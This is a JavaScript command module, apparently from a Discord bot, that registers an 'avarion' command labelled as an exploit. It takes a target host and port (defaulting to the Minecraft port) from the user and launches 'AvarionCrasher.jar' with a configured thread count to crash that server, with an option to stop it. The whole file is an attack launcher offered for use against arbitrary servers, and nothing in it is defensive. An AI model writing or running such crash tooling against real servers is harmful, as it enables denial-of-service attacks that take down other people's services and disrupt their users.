/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');

module.exports = new Command({
    name: "avarion",
    description: "Эксплоит avarion",
    permissions: "SEND_MESSAGES",
    async execute(client, args, message){
        const iphost = args[1].split(":").slice(0,1);
        const port = args[1].split(":") [1] || 25565;
        
        if(!args[2]){ 
            runjar("AvarionCrasher.jar", `host-${iphost} port-${port} threads-${threads.avarion}`, true);
            runcrash(`AvarionCrasher 💥`, iphost, port, true);
        }
        if(args[2] == "manualstop"){
             runjar("AvarionCrasher.jar", `host-${iphost} port-${port} threads-${threads.avarion}`, false);
             runcrash(`AvarionCrasher 💥`, iphost, port, false);
        }
    }
});